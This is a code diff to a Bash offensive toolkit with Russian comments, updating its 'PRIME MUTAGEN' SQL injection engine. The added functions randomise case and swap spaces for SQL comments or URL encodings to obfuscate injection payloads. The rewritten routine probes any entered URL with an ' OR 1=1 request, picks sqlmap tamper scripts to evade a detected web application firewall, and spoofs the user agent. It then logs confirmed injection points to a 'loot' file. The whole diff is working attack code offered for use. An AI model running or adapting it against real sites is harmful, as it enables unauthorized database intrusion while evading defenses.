@@ -354,6 +354,34 @@ smart_cat() {
 }
 
 
+# --- ENGINE: NEURAL OBSTRUCTION (Вставлять перед функцией run_sql_adaptive) ---
+mutate_case() {
+    local input="$1"
+    local output=""
+    for (( i=0; i<${#input}; i++ )); do
+        char="${input:$i:1}"
+        (( RANDOM % 2 )) && output+="${char^^}" || output+="${char,,}"
+    done
+    echo -n "$output"
+}
+
+mutate_space() {
+    local variants=("/**/" "+" "%20" "%09" "%0a" "/**/--/**/")
+    echo -n "${variants[$(( RANDOM % ${#variants[@]} ))]}"
+}
+
+# Адаптация под SQL-инъекции
+prime_obfuscate() {
+    local payload="$1"
+    local result=""
+    for word in $payload; do
+        result+="$(mutate_case "$word")$(mutate_space)"
+    done
+    echo -n "$result"
+}
+
+
+
 get_tool_info() {
     case "$1" in
         # --- Главное меню (Main Menu) ---
@@ -987,8 +1015,6 @@ run_network_analyzer() {
 }
 
 
-
-
 generate_phantom_server_code() {
     local target_file="$1"
     local mode="$2"
@@ -1104,61 +1130,62 @@ EOF
 
 
 run_sql_adaptive() {
-    print_header "PRIME MUTAGEN: SQL INJECTION ENGINE v8.0"
+    print_header "PRIME MUTAGEN: SQL INJECTION ENGINE v8.5 (Neural Enhanced)"
 
     echo -en "${Y}Enter Target URL: ${NC}"
     read -r target_url
     [[ -z "$target_url" ]] && return
 
-    # --- СЛОЙ 1: ЭВРИСТИЧЕСКАЯ ОЦЕНКА ФИЛЬТРАЦИИ ---
+    # --- СЛОЙ 1: ЭВРИСТИКА ---
     print_status "i" "Probing WAF/IPS resistance layers..."
-    
-    # Быстрый тест на реакцию сервера при вводе спецсимволов
     local waf_reaction=$(curl -s -o /dev/null -w "%{http_code}" -A "Mozilla/5.0" "$target_url%27%20OR%201=1")
     
-    # --- СЛОЙ 2: ГЕНЕРАТОР ПОЛИМОРФНОЙ НАГРУЗКИ (No-IF) ---
-    # Мы рассчитываем уровень агрессии на основе кода ответа (403/406 - WAF, 200 - Open)
-    local aggression_level=$(( (waf_reaction / 100) )) # Код 4xx даст 4, 2xx даст 2
-    
-    # Динамический выбор мутагенов через матрицу соответствия
-    # Чем выше код ошибки, тем сложнее обфускация
+    # --- СЛОЙ 2: НЕЙРОННАЯ МУТАЦИЯ (Собственный код) ---
+    # Генерируем уникальный заголовок для сессии, чтобы сбить биометрию трафика
+    local neural_agent="Prime-$(mutate_case "agent")-$RANDOM"
+    print_status "s" "Neural Header Generated: $neural_agent"
+
+    # --- СЛОЙ 3: АДАПТИВНОЕ ИСПОЛНЕНИЕ ---
+    local aggression_level=$(( (waf_reaction / 100) ))
+    [[ $aggression_level -lt 2 ]] && aggression_level=2 # Минимум 2
+
     local tamper_matrix=(
         "2:between,randomcase"
-        "4:between,charencode,space2comment,versionedmorekeywords,base64encode"
-        "5:between,charencode,space2comment,randomcase,percentage,overlongutf8"
+        "4:between,charencode,space2comment,versionedmorekeywords"
+        "5:between,charencode,space2comment,randomcase,percentage"
     )
     
-    # Выбираем мутаген на основе агрессии (автоматический поиск в массиве)
     local selected_tampers=$(printf '%s\n' "${tamper_matrix[@]}" | grep "^$aggression_level:" | cut -d: -f2)
-    # Фоллбек (если код ответа нестандартный)
-    [[ -z "$selected_tampers" ]] && selected_tampers="between,randomcase,space2comment"
+    [[ -z "$selected_tampers" ]] && selected_tampers="between,randomcase"
 
-    # --- СЛОЙ 3: АДАПТИВНОЕ ИСПОЛНЕНИЕ (Ghost Mode) ---
-    print_status "s" "Applying Mutagen: $selected_tampers (Aggression: $aggression_level)"
+    print_status "s" "Applying Neural Obfuscation & Tampers: $selected_tampers"
 
-    local out_dir="/tmp/mutagen_$RANDOM"
-    # Использование --second-order для поиска скрытых инъекций и --smart для пропуска неперспективных целей
-    local base_args="--batch --random-agent --smart --mobile --output-dir=$out_dir --flush-session"
-    local stealth_args="--tamper=$selected_tampers --delay=$((aggression_level / 2)) --safe-freq=10"
-
+    # Динамический путь к луту (из нашей новой конфигурации)
+    local out_dir="$PRIME_LOOT/mutagen_session_$RANDOM"
+    
+    # Запуск с кастомным агентом и расширенными параметрами скрытности
     {
-        sqlmap -u "$target_url" $base_args $stealth_args --level=$aggression_level --risk=2 --threads=1 
+        sqlmap -u "$target_url" --batch --random-agent --user-agent="$neural_agent" \
+        --smart --mobile --output-dir="$out_dir" --flush-session \
+        --tamper="$selected_tampers" --level=$aggression_level --risk=2 \
+        --delay=$((aggression_level / 2)) --safe-freq=10 --threads=1
     } &
 
-    show_progress 15 "Evolving payload mutations..."
+    show_progress 15 "Neural-Evolving payload mutations..."
 
     # --- СЛОЙ 4: ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ ---
     print_status "s" "Mutation Cycle Finished."
     
-    # Вместо IF используем автоматический экспорт находок
-    local report=$(find "$out_dir" -name "log" -exec cat {} + 2>/dev/null)
-    [[ -n "$report" ]] && {
-        print_status "y" "EXPLOIT SECURED: Vulnerability confirmed."
-        echo "$report" | grep -Ei "Type:|Payload:|Parameter:" | tee -a "$LOOT_DIR/sql_leads.log"
+    # Поиск результатов и запись в глобальный лут
+    local log_file=$(find "$out_dir" -name "log" 2>/dev/null)
+    [[ -f "$log_file" ]] && {
+        print_status "y" "EXPLOIT SECURED: Findings integrated."
+        echo -e "\n[$(date)] TARGET: $target_url" >> "$PRIME_LOOT/sql_success.log"
+        grep -Ei "Type:|Payload:|Parameter:" "$log_file" | tee -a "$PRIME_LOOT/sql_success.log"
     }
 
-    # Сигнал для Моста (Bridge)
-    echo "SOURCE: $target_url | STATUS: SCANNED | MUTAGEN: $selected_tampers" >> "$LOOT_DIR/bridge_signals.log"
+    # Сигнал для системы мониторинга (Bridge)
+    echo "TIME: $(date) | SRC: $target_url | AGGR: $aggression_level" >> "$PRIME_LOOT/bridge_signals.log"
     
     rm -rf "$out_dir"
     pause
